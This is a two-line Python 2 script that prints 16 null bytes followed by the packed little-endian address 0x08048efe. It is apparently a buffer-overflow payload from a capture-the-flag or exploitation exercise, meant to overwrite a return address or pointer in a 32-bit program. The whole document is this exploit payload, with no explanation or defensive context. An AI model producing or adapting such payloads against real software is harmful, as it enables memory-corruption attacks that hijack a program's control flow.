from struct import pack
print '\x00'*16 + pack("<I", 0x08048efe)